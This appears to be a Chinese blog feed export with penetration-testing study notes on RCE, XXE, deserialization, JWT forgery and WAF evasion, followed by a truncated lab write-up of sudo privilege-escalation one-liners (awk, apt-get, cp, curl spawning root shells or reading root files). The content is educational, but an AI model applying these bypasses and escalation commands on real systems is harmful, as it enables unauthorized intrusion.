title="RCE代码及系统命令执行漏洞"></a>RCE代码及系统命令执行漏洞</h3><h5 id="判断系统"><a href="#判断系统" class="headerlink" title="判断系统"></a>判断系统</h5><ul><li>linux</li><li>windows</li></ul><h5 id="可能产生点"><a href="#可能产生点" class="headerlink" title="可能产生点"></a>可能产生点</h5><ul><li>web源码</li><li>中间件</li><li>其他环境</li></ul><h5 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h5><ul><li>白盒 【代码审计】</li><li>黑盒 【漏扫工具 公开漏洞 手工看参数或功能点】</li></ul><h5 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h5><ul><li>waf</li><li>敏感函数禁用</li><li>变量过滤</li></ul><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含<a id="文件包含漏洞"></a></h4><h5 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h5><ul><li>直接包含</li><li>后缀截断%00</li><li>垃圾数据截断&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.</li><li>可结合文件上传</li><li>⚠filter链实现rce</li></ul><h5 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h5><ul><li>直接在自己网站放后门文件 -&gt; 远程包含后门文件 -&gt; 菜刀 蚁剑链接</li><li>截断</li></ul><h5 id="伪协议流包含"><a href="#伪协议流包含" class="headerlink" title="伪协议流包含"></a><a href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE">伪协议流包含</a></h5><h5 id="黑盒测试思路"><a href="#黑盒测试思路" class="headerlink" title="黑盒测试思路"></a>黑盒测试思路</h5><ul><li>cms漏洞&#x2F;源码分析</li><li>漏扫工具</li></ul><h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><h5 id="找漏洞"><a href="#找漏洞" class="headerlink" title="找漏洞"></a>找漏洞</h5><ul><li>参数值</li><li>功能点</li><li>漏扫工具</li></ul><h5 id="得到目录"><a href="#得到目录" class="headerlink" title="得到目录"></a>得到目录</h5><ul><li>目录扫描工具</li><li>根据可见文件分析</li></ul><h5 id="防过滤"><a href="#防过滤" class="headerlink" title="防过滤"></a>防过滤</h5><ul><li>..&#x2F;..&#x2F;</li><li>%20 %00</li></ul><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><h5 id="nginx目录穿越"><a href="#nginx目录穿越" class="headerlink" title="nginx目录穿越"></a>nginx目录穿越</h5><ul><li>配置别名时出现疏忽</li><li>如配置<code>/etc/download/</code>的别名为<code>/file/ -&gt; /file</code>忘记&#x2F;导致目录穿越</li><li>利用 <code>/file../</code>可跳转到上层目录 <code>/etc/download/../</code> 即 <code>/etc</code></li></ul><h5 id="java-WEB"><a href="#java-WEB" class="headerlink" title="java WEB"></a>java WEB</h5><ul><li>webinf&#x2F;web.xml 存放信息</li><li>参数用POST传递</li><li><a href="https://blog.csdn.net/Mrs_H/article/details/119576821">WEB-INF&#x2F;web.xml泄露漏洞及其利用</a></li></ul><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><ul><li>一般借助类的某些方法辅助实现</li><li>结合RCE(代码执行)等漏洞使用</li></ul><h5 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h5><ul><li>将对象转换成字符串(序列化)<code>serialize()</code></li><li>反序列化<code>unserialize()</code></li><li>类对象序列化再反序列化时会调用苏醒函数<code>__wakeup()</code></li><li>创建类时调用构造函数<code>__construct()</code></li><li>类对象被echo或当作字符串操作时会调用<code>__toString()</code></li></ul><h5 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h5><ul><li>有多个类，他们的魔术方法可以起到不同作用，此时需要分析入口和出口函数，不断地构建对象，对象的属性互为其他对象，以此来达到链式调用的结果</li></ul><h5 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h5><ul><li>如果函数里没有 <code>unserialize</code> 函数，但是又存在反序列化漏洞或可以构造pop链，就可以尝试利用phar来进行反序列化，原理为phar格式的压缩包数据内容为序列化格式存储，在利用某些函数调用phar格式的文件时，会自动进行反序列化</li></ul><h5 id="php反序列化字节逃逸"><a href="#php反序列化字节逃逸" class="headerlink" title="php反序列化字节逃逸"></a>php反序列化字节逃逸</h5><ul><li>常存在于存在过滤的情况，由于序列化后的数据内容中值的长度是由数字唯一确定的，，那么进行长度不对等的过滤替换后，会在在原来的序列传中截取出新的串，从而实现我们想要执行的某些结果(比如控制一些无法控制的值)</li></ul><h5 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h5><ul><li><p>工具<code>ysoserial</code></p><h6 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h6><ul><li>黑盒看参数 以<code>rO0AB(base64) 或 aced(base16)</code> 开头</li><li>白盒找<code>readobject() writeobject</code></li></ul></li><li><p>利用 反弹shell RCE 弹计算器(bushi)</p></li></ul><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><code>xml external entity injection </code>xml外部实体注入漏洞</p><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ul><li>文件读取</li><li>代码执行</li><li>内网攻击</li><li>DOS攻击</li></ul><h4 id="检测-2"><a href="#检测-2" class="headerlink" title="检测"></a>检测</h4><h5 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h5><ul><li>函数及可控变量查找</li><li>传输和储存数据格式类型</li></ul><h5 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h5><ul><li>更改content-Type 为 application&#x2F;xml 看是否接受</li></ul><h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><h5 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h5><ul><li>协议 <code>http file</code></li><li>引入外部实体</li></ul><h5 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h5><ul><li>读取指定内容 base64编码后 赋值给<code>file</code></li><li>访问远程地址的 <code>test.dtd</code>文件</li><li>test.dtd 内写有 带参数<code>?data=%file</code> 访问自己的网站</li><li>查看网站的日志得到  file 内容</li></ul><h4 id="实战-vulnhub-xxe"><a href="#实战-vulnhub-xxe" class="headerlink" title="实战(vulnhub&#x2F;xxe)"></a>实战(vulnhub&#x2F;xxe)</h4><ul><li>下载镜像文件</li><li>打开发现需要登陆密码</li><li>用主机开nmap扫到80端口</li><li>进去看到ubuntu欢迎界面</li><li>dirsearch扫目录得到rebots.txt</li><li>rebots.txt里看到&#x2F;xxe目录</li><li>访问&#x2F;xxe 看到登录框</li><li>任意文件读取读到&#x2F;xxe&#x2F;admin.php源码</li><li>从源码中得到账号密码登录</li><li>得到flag网址(假) 打不开</li><li>任意文件读取假的flag网址得到base32字符串</li><li>base32 base64解码得到真正的flag地址 &#x2F;etc&#x2F;.flag</li><li>base64解码 得到一串混淆过的php源码</li><li>在线运行 报错 得到flag</li></ul><h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><ul><li>禁用外部实体</li><li>过滤用户提交的xml数据</li><li>装waf</li></ul><h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><h4 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><ul><li>javascript类&#x2F;对象存在一个<strong>原型对象</strong>，构造函数的 <code>prototype</code> 就等于实例化对象的 <code>__proto__</code> ，也就是说，修改一个对象的 <code>__proto__</code> 的属性，就会修改这个对象的原型对象的属性</li><li>javascript对象的属性具有<strong>向上继承</strong>的特性，如果一个对象并不具有某个属性，那么在调用这个属性的时候便会向<strong>原型对象</strong>的属性去寻找，<strong>依次往上</strong>直到找到属性或null</li><li>利用以上两点，便可以实现以下功能：修改 a 对象的<strong>原型对象</strong>，使 b 对象的某个属性值发生变化，即<strong>如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</strong></li></ul><h5 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h5><ul><li>存在不安全的对象递归合并(merge)</li></ul><h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><ul><li>newstar2023 week3 okjigirl</li></ul><h2 id="逻辑问题"><a href="#逻辑问题" class="headerlink" title="逻辑问题"></a>逻辑问题</h2><h3 id="业务逻辑"><a href="#业务逻辑" class="headerlink" title="业务逻辑"></a>业务逻辑</h3><h4 id="逻辑越权"><a href="#逻辑越权" class="headerlink" title="逻辑越权"></a>逻辑越权</h4><h5 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h5><ul><li>依赖于数据包 查看、修改同级别用户的信息</li></ul><h5 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h5><ul><li>下载源码或自行构造管理员命令数据包</li><li>使用普通用户的身份证明替换管理员身份证明 仍然可以执行管理员功能</li></ul><h4 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h4><h5 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h5><ul><li>身份不同只有看到的代码不同，实现功能的部分没有做验证</li></ul><h4 id="工具使用-1"><a href="#工具使用-1" class="headerlink" title="工具使用"></a>工具使用</h4><ul><li>中通检测工具</li><li>secson-check</li><li>burp插件 authz</li></ul><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><ul><li>前后端同时验证</li><li>每个功能点都验证权限</li><li>加密</li><li>过滤参数</li></ul><h3 id="登录脆弱"><a href="#登录脆弱" class="headerlink" title="登录脆弱"></a>登录脆弱</h3><h4 id="账号密码爆破"><a href="#账号密码爆破" class="headerlink" title="账号密码爆破"></a>账号密码爆破</h4><ul><li>明文传输</li><li>加密传输</li></ul><h4 id="cookie脆弱"><a href="#cookie脆弱" class="headerlink" title="cookie脆弱"></a>cookie脆弱</h4><ul><li>源码审计</li><li>手动看登陆后的cookie</li></ul><h3 id="数据篡改-支付漏洞"><a href="#数据篡改-支付漏洞" class="headerlink" title="数据篡改(支付漏洞)"></a>数据篡改(支付漏洞)</h3><h4 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h4><ul><li>订单号</li><li>商品数量、单价</li><li>支付接口</li><li>支付状态</li></ul><h4 id="常见修改方法"><a href="#常见修改方法" class="headerlink" title="常见修改方法"></a>常见修改方法</h4><ul><li>替换支付</li><li>重复支付</li><li>最小额支付</li><li>负数支付</li><li>溢出支付</li><li>优惠券支付</li></ul><h3 id="找回绕过"><a href="#找回绕过" class="headerlink" title="找回绕过"></a>找回绕过</h3><h4 id="验证和操作不同时"><a href="#验证和操作不同时" class="headerlink" title="验证和操作不同时"></a>验证和操作不同时</h4><ul><li>直接操作绕过验证</li></ul><h4 id="前端验证-1"><a href="#前端验证-1" class="headerlink" title="前端验证"></a>前端验证</h4><ul><li>burp抓返回包 修改返回值</li><li>后端验证则无效</li></ul><h3 id="token-验证码"><a href="#token-验证码" class="headerlink" title="token 验证码"></a>token 验证码</h3><h4 id="验证码安全"><a href="#验证码安全" class="headerlink" title="验证码安全"></a>验证码安全</h4><ul><li>客户端回显(数据包直接能看到)</li><li>验证码复用</li><li>验证码爆破(工具 pkavhttpfuzzer 插件 reCAPTCHA captcha-killer)</li><li>绕过</li></ul><h4 id="token"><a href="#token" class="headerlink" title="token"></a>token</h4><ul><li>爆破(识别或猜测出加密方法)</li><li>回显(下一token在response中可以看到 利用burp正则匹配自动填写)</li></ul><h2 id="JAVA-安全"><a href="#JAVA-安全" class="headerlink" title="JAVA 安全"></a>JAVA 安全</h2><h4 id="javascript原型链污染"><a href="#javascript原型链污染" class="headerlink" title="javascript原型链污染"></a>javascript原型链污染</h4><h4 id="sql注入-1"><a href="#sql注入-1" class="headerlink" title="sql注入"></a>sql注入</h4><ul><li>session注入</li><li>利用预编译防止注入(解决大部分问题)</li><li>绕过预编译↑ <code>case when</code> 要求 数据按某项元素排序且改列名可控 <code>order by + column</code></li></ul><h3 id="JWT安全"><a href="#JWT安全" class="headerlink" title="JWT安全"></a>JWT安全</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><ul><li><a href="https://blog.csdn.net/weixin_50464560/article/details/120579337">JWT攻击手册(附jwt_tool用法,爆破弱密钥等)</a></li><li>json web token 跨域验证身份的方案</li><li>不加密传输的数据，但能通过数字签名来验证数据未被篡改、</li></ul><h4 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h4><ul><li>头(base64) 存储加密方式</li><li>声明(base64) 存储数据</li><li>签名(头部的加密方式结合密匙)</li></ul><h4 id="伪造"><a href="#伪造" class="headerlink" title="伪造"></a>伪造</h4><ul><li>有密匙的话直接解 无密匙往下走</li><li>直接将头部加密方式设为 none</li><li>失效时间改为靠后</li><li>删除签名部分</li><li>修改可能被url编码的符号<code>+变- /变_ =去掉</code></li></ul><h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><ul><li>拿到令牌token 解码出加密方式和声明内容</li><li>通过脚本完成以下内容</li><li>批量跑字典来通过指定的加密方式加密内容</li><li>比对得到的签名base64编码后和原始签名是否一致</li><li>当匹配到一致后则输出该密匙</li></ul><h3 id="其他漏洞的java形式"><a href="#其他漏洞的java形式" class="headerlink" title="其他漏洞的java形式"></a>其他漏洞的java形式</h3><h4 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传"></a>文件上传</h4><ul><li>任意目录覆盖上传</li><li>绕过目录解析，执行脚本</li></ul><h4 id="不安全登录"><a href="#不安全登录" class="headerlink" title="不安全登录"></a>不安全登录</h4><ul><li>账号密码可直接在js获得</li></ul><p>…</p><ul><li>⚠javaWeb的参数不以参数名识别，只与传参顺序有关</li></ul><h4 id="app安全"><a href="#app安全" class="headerlink" title="app安全"></a>app安全</h4><ul><li>一键反编译</li><li>漏了个大洞</li></ul><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><h3 id="系统漏洞"><a href="#系统漏洞" class="headerlink" title="系统漏洞"></a>系统漏洞</h3><h4 id="探针工具"><a href="#探针工具" class="headerlink" title="探针工具"></a>探针工具</h4><ul><li><p>Goby(界面友好，快速)[<a href="https://gobies.org]">https://gobies.org]</a></p></li><li><p>Nmap(支持自定义插件)</p><h5 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h5><ul><li>全面 高效 </li><li>需要自行开启Tanable Nessus服务后在浏览器端使用</li><li><a href="https://www.freebuf.com/sectool/350938.html">Nessus 离线破解更新插件教程</a></li></ul></li><li><p>OpenVAS</p></li><li><p>Nexpose</p></li></ul><h4 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h4><ul><li>远程代码执行</li><li>权限提升</li><li>缓冲区溢出</li><li>…</li></ul><h4 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h4><h5 id="工具框架"><a href="#工具框架" class="headerlink" title="工具框架"></a>工具框架</h5><ul><li>渗透测试工具Metasploit  -&gt; kali和忍者上装载的msfconsole</li><li>Searchsploit 漏洞查找工具</li><li>企业单位内部产品</li></ul><p>​一般利用searchsploit或者直接在探针工具上找到漏洞对应编号 利用msf进行测试</p><h5 id="单点Exp"><a href="#单点Exp" class="headerlink" title="单点Exp"></a>单点Exp</h5><ul><li>cmd</li><li>国内漏洞共享平台[<a href="https://www.cnvd.org.cn]">https://www.cnvd.org.cn]</a></li><li>知道创宇[<a href="https://www.seebug.org]">https://www.seebug.org]</a></li><li>1337day[<a href="https://mrxn.net/share/0day-today.html]">https://mrxn.net/share/0day-today.html]</a></li><li><a href="https://exploit-db.com/">https://exploit-db.com</a></li><li>Packetstorm Security</li></ul><h4 id="如何修复"><a href="#如何修复" class="headerlink" title="如何修复"></a>如何修复</h4><ul><li>打补丁</li><li>360 …</li><li>关闭入口</li><li>防护应用</li></ul><h3 id="web漏洞"><a href="#web漏洞" class="headerlink" title="web漏洞"></a>web漏洞</h3><h4 id="已知cms"><a href="#已知cms" class="headerlink" title="已知cms"></a>已知cms</h4><ul><li>如常见的dedecms.discuz,wordpress等源码结构，可利用公开的漏洞(vulhub,seebug…)进行测试，或者自行下载cms代码进行白盒审计</li></ul><h4 id="已知开发框架"><a href="#已知开发框架" class="headerlink" title="已知开发框架"></a>已知开发框架</h4><ul><li>如thinkphp, spring, flask等开发的源码程序，获取相应的框架信息，通过公共的安全问题进行测试，如果不存在则自行白盒审计</li></ul><h4 id="未知cms"><a href="#未知cms" class="headerlink" title="未知cms"></a>未知cms</h4><ul><li>可能是企业的或个人的内部程序源码，也可能是某cms二次开发的源码结构，针对此类源码程序，如果能识别出二次开发就按已知的cms思路进行，不能确定二次开发的话可以利用常规综合类扫描工具或脚本进行漏扫，也可以人工探针(功能点，参数，盲猜)，如果能拿到源码则进行白盒审计</li></ul><h5 id="漏扫工具"><a href="#漏扫工具" class="headerlink" title="漏扫工具"></a>漏扫工具</h5><ul><li><a href="https://blog.csdn.net/weixin_42248871/article/details/120981838">Xray简单使用</a></li><li><a href="https://zhuanlan.zhihu.com/p/384677028">AWVS下载、安装、使用教程</a></li><li>appscan</li></ul><h3 id="app漏洞"><a href="#app漏洞" class="headerlink" title="app漏洞"></a>app漏洞</h3><h4 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h4><h5 id="http-https"><a href="#http-https" class="headerlink" title="http&#x2F;https"></a>http&#x2F;https</h5><ul><li>burp</li><li>charles</li><li>fiddler</li><li>抓包精灵</li></ul><h5 id="其他协议"><a href="#其他协议" class="headerlink" title="其他协议"></a>其他协议</h5><ul><li>wireshark</li></ul><h5 id="burp＋xray"><a href="#burp＋xray" class="headerlink" title="burp＋xray"></a>burp＋xray</h5><p>利用burp抓包转发到本机端口(6666) xray监听本机6666端口被动扫描</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">xray<span class="hljs-selector-class">.exe</span> webscan <span class="hljs-attr">--listen</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><ul><li>漏了个大洞</li><li>一键反编译</li></ul><h3 id="服务协议"><a href="#服务协议" class="headerlink" title="服务协议"></a>服务协议</h3><h4 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h4><ul><li>web服务类</li><li>数据库类</li><li>大数据类</li><li>文件共享</li><li>远程访问</li><li>邮件服务</li><li>其他服务</li></ul><h4 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="弱口令爆破"></a>弱口令爆破</h4><ul><li>基于网页的可利用burp爆破</li><li>基于协议(ssh,mysql等)的弱口令爆破可利用工具</li></ul><h4 id="api接口"><a href="#api接口" class="headerlink" title="api接口"></a>api接口</h4><ul><li>部分网站调用接口api(如WSDL)可利用漏扫工具扫描</li></ul><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p><h4 id="反爬虫延时代理池"><a href="#反爬虫延时代理池" class="headerlink" title="反爬虫延时代理池"></a>反爬虫延时代理池</h4><ul><li>延时爬取</li><li>百度等爬虫头</li><li>付费代理池</li></ul><h4 id="代理池指纹被动探针"><a href="#代理池指纹被动探针" class="headerlink" title="代理池指纹被动探针"></a>代理池指纹被动探针</h4><p><strong>扫描工具的指纹(如ua或者一些payload) 容易被waf记录并识别 此时可以采用一些方法来进行绕过</strong></p><ul><li>代理池 Proxy_pool (搭过 免费的极不好用  建议充钱)</li><li>延时 被动扫描  </li><li>payload绕过</li></ul><h5 id="工具之间的联动"><a href="#工具之间的联动" class="headerlink" title="工具之间的联动"></a>工具之间的联动</h5><ul><li>使用awvs(初次扫描，控制速度) + burp(查看发包速度和数据) + xray(二次扫描)</li><li>xray无法控制延时和UA 所以用awvs控制  两次扫描可以一定程度上避免payload识别拦截</li></ul><h4 id="漏洞利用-可能被拦截的洞"><a href="#漏洞利用-可能被拦截的洞" class="headerlink" title="漏洞利用(可能被拦截的洞)"></a>漏洞利用(可能被拦截的洞)</h4><h5 id="sql注入-2"><a href="#sql注入-2" class="headerlink" title="sql注入"></a>sql注入</h5><ul><li>sqlmap  上代理过cc  UA爬虫头过工具指纹黑名单</li><li>自己编写tamper模块 绕各种payload拦截</li></ul><h5 id="文件上传-2"><a href="#文件上传-2" class="headerlink" title="文件上传"></a>文件上传</h5><ul><li><p>文件名回车截断</p><p><a href="#upload_waf">前文提到</a></p></li></ul><h5 id="xss跨站"><a href="#xss跨站" class="headerlink" title="xss跨站"></a>xss跨站</h5><ul><li><a href="#xss_bypass">xss_bypass</a></li><li>xsstrike(工具 可以配置代理和延时)</li></ul><h5 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含"></a><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E">文件包含</a></h5><h5 id="RCE执行"><a href="#RCE执行" class="headerlink" title="RCE执行"></a>RCE执行</h5><ul><li>十六进制编码解码 利用assert()函数执行</li><li>str_replace 进行字符替换绕过黑名单</li><li>变量拆分组合 <code>$a=&quot;asse&quot;;$b=&quot;rt&quot;;$c=$a.$b;$c()</code></li><li>更改请求方式 <code>get post request</code></li></ul><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><h4 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a>工具利用</h4><ul><li>使用fortify进行白盒审计(任意类型文件)</li><li>使用seay进行php审计</li></ul><h4 id="手工-脚本审计"><a href="#手工-脚本审计" class="headerlink" title="手工&#x2F;脚本审计"></a>手工&#x2F;脚本审计</h4><h5 id="关键字搜索"><a href="#关键字搜索" class="headerlink" title="关键字搜索"></a>关键字搜索</h5><ul><li>接受参数 <code>$_get</code> 之类的 和 输出类函数 如<code>echo</code></li><li>数据库操作关键词 <code>select</code> <code>insert</code> <code>update</code> <code>sql执行语句</code></li><li>命令执行关键词 <code>exec</code></li></ul><h5 id="功能点"><a href="#功能点" class="headerlink" title="功能点"></a>功能点</h5><ul><li>文件传输处(如会员中心)可能存在文件上传 文件读取 文件执行</li><li>登录框存在xss sql注入</li></ul><h5 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h5><ul><li>执行过程前后顺序</li><li>调用文件列表</li></ul><h4 id="php无框架sql注入"><a href="#php无框架sql注入" class="headerlink" title="php无框架sql注入"></a>php无框架sql注入</h4><ul><li><p>绕过魔术引号 宽字节注入 二次注入</p></li><li><p>php源码审计工具-&gt;数据库监控  看数据库交互</p></li><li><p><strong>74cms 二次注入 先insert再update 更新的时候语句被执行</strong></p></li><li><p>数据库监视脚本网页版(运行在web端)</p></li><li><p><strong>maccms源码</strong> get方式会识别url编码 可以用二次编码绕过强制性的编码替换</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>学习</tag>
      
      <tag>笔记</tag>
      
      <tag>渗透测试</tag>
      
      <tag>知识点</tag>
      
      <tag>小迪公开课</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hacksudoLPE</title>
    <link href="/2023/11/26/hacksudoLPE/"/>
    <url>/2023/11/26/hacksudoLPE/</url>
    
    <content type="html"><![CDATA[<h2 id="challenge-1"><a href="#challenge-1" class="headerlink" title="challenge 1"></a>challenge 1</h2><p>sudo提权，共有30关</p><img src="/.io//11/26/hacksudoLPE/image-20231001144703604.png" class title="image-20231001144703604"><p>各指令提权<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><h3 id="apt-get提权"><a href="#apt-get提权" class="headerlink" title="apt-get提权"></a>apt-get提权</h3><ul><li><p>sudo -l 查看可执行文件，发现可以apt-get</p></li><li><p>执行以下命令提权</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> changelog apt<br>!/bin/sh<br><span class="hljs-comment"># viluhacker</span><br></code></pre></td></tr></table></figure><img src="/.io//11/26/hacksudoLPE/image-20231001144538488.png" class title="image-20231001144538488"></li></ul><h3 id="arp越权读文件"><a href="#arp越权读文件" class="headerlink" title="arp越权读文件"></a>arp越权读文件</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">f</span>=file_to_read<br>sudo arp -v -f <span class="hljs-string">&quot;<span class="hljs-variable">$f</span>&quot;</span><br></code></pre></td></tr></table></figure><img src="/.io//11/26/hacksudoLPE/image-20231001145509793.png" class title="image-20231001145509793"><h3 id="awk提权"><a href="#awk提权" class="headerlink" title="awk提权"></a>awk提权</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo awk <span class="hljs-symbol">&#x27;BEGIN</span> &#123;system(<span class="hljs-string">&quot;/bin/sh&quot;</span>)&#125;&#x27;<br></code></pre></td></tr></table></figure><img src="/.io//11/26/hacksudoLPE/image-20231001193142947.png" class title="image-20231001193142947"><h3 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=file_to_read<br>sudo <span class="hljs-built_in">base32</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LFILE</span>&quot;</span> | <span class="hljs-built_in">base32</span> --decode<br></code></pre></td></tr></table></figure><img src="/.io//11/26/hacksudoLPE/image-20231001193635774.png" class title="image-20231001193635774"><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=file_to_read<br>sudo <span class="hljs-built_in">base64</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LFILE</span>&quot;</span> | <span class="hljs-built_in">base64</span> --decode<br></code></pre></td></tr></table></figure><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">cat</span> /root/root.txt<br></code></pre></td></tr></table></figure><h3 id="comm"><a href="#comm" class="headerlink" title="comm"></a>comm</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo comm <span class="hljs-regexp">/root/</span>root.txt <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 写</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;DATA&quot;</span> | sudo <span class="hljs-built_in">cp</span> /dev/stdin /root/root.txt<br><span class="hljs-comment"># 读</span><br>sudo <span class="hljs-built_in">cp</span> /root/root.txt /dev/stdin<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">cp</span> /bin/sh /bin/cp<br>sudo <span class="hljs-built_in">cp</span><br></code></pre></td></tr></table></figure><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo curl file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/root/</span>root.txt<br></code></pre></td></tr></table></figure><h3 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;&quot;</span> -f1 /root/root.txt<br></code></pre></td></tr></table></figure><h3 id="dash"><a href="#dash" class="headerlink" title="dash"></a>dash</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo dash</span><br></code></pre></td></tr></table></figure><h3 id="date"><a href="#date" class="headerlink" title="date"></a>date</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">date</span> -f /root/root.txt<br></code></pre></td></tr></table></figure><h3 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo diff 